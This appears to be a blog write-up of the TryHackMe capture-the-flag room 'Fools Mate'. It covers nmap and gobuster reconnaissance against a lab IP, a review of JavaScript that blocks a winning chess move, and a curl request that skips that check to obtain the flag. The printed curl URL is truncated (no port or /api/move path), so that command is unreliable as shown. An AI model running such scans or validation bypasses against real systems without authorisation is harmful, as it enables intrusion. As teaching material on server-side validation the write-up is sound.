Bypassing Client-Side Validation on TryHackMe’s "Fools Mate"

Client-side validation is a classic security anti-pattern. Relying entirely on the user's browser to enforce business rules or game logic opens the door to complete bypasses.

In this writeup, we will walk through **Fools Mate** on TryHackMe, demonstrating how to intercept and manipulate direct API requests to completely ignore front-end restrictions.

---

1. Enumeration & Reconnaissance

The engagement begins with a standard network scan using **Nmap** to identify active services running on the target machine.

bash

```
nmap -sV -sC -T4 10.112.141.19
```

Use code with caution.

Scan Results:

- **Port 22/TCP (Open)**: OpenSSH 9.6p1 (Ubuntu Linux).
- **Port 3000/TCP (Open)**: Node.js Express framework hosting a web application titled **"Endgame Trainer"**.

The application is running on port 3000 rather than the traditional web ports (80/443).

---

2. Directory Discovery (Vulnerability Testing)

To map the structure of the Node.js application, **Gobuster** was deployed for directory brute-forcing.

bash

```
gobuster dir -u http://10.112.141.19:3000 -w /usr/share/wordlists/dirb/common.txt
```

Use code with caution.

Gobuster Output:

- `/css` (Status: 301) — Cascading Style Sheets directory.
- `/index.html` (Status: 200) — Main chess interface page.
- `/js` (Status: 301) — Directory containing application JavaScript logic.
- `/vendor` (Status: 301) — External libraries and frameworks.

The presence of the `/js` folder indicates that the structural and tactical validation of the chess pieces is handled locally by the browser.

---

3. Vulnerability Analysis & Access Control

Upon interacting with the application at `http://10.112.141.19:3000`, the interface displays a standard chess board showing a clear "Mate-in-one" scenario. Moving the White Rook from **a1** to **a8** should instantly trigger a checkmate.

However, attempting this specific winning move drops an adversarial error prompt:

> _"I'll shut down your PC if you play that."_

Source Code Review

Inspecting the application logic within `/js/app.js` reveals the defensive control blocking the player:

javascript

```
function preMoveCheck(from, to, promotion) {
  const probe = new Chess(game.fen());
  let result;
  try {
    result = probe.move({ from, to, promotion: promotion || undefined });
  } catch (e) { result = null; }
  
  if (result && probe.isCheckmate()) {
    showSystemNotice("I'll shut down your PC if you play that.");
    return false;
  }
  return true;
}
```

Use code with caution.

The application relies completely on the browser to audit the move. If `probe.isCheckmate()` evaluates to true, the browser forces a code return of `false`, killing the execution flow before the move can ever be submitted through normal channels.

---

4. Exploitation (The Client-Side Bypass)

In secure web development, **all user inputs must be validated on the server**. Because this control is restricted strictly to the client's interface, it can be entirely ignored by routing a custom payload directly to the backend.

Looking further down the source file, regular moves are handled by an internal API fetch routing a `POST` request to `/api/move`.

By leveraging **Curl**, we can synthesize a raw HTTP request directly to the API endpoint, bypassing the `preMoveCheck` script block altogether.

Execution Command:

bash

```
curl -X POST 'http://10.112.141' \
  -H 'Content-Type: application/json' \
  --data-raw '{"from":"a1","to":"a8"}'
```

Use code with caution.

Server Response:

The server processes the checkmate parameters without verifying whether it came through the UI or a raw terminal request, successfully returning the prize flag:

json

```
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "flag": "THM{cl13nt_s1d3_ch3ckm4t3}"
}
```

Use code with caution.

**Captured Flag:** `THM{cl13nt_s1d3_ch3ckm4t3}`

---

Key Takeaway

Never rely on JavaScript or front-end filters to secure sensitive features. Any parameter, state change, or operational logic occurring entirely inside a user's browser should be treated as untrusted and thoroughly validated server-side.

_If you enjoyed this breakdown, feel free to leave a clap and drop a follow for more walk-throughs! Happy hacking! 🧑‍💻_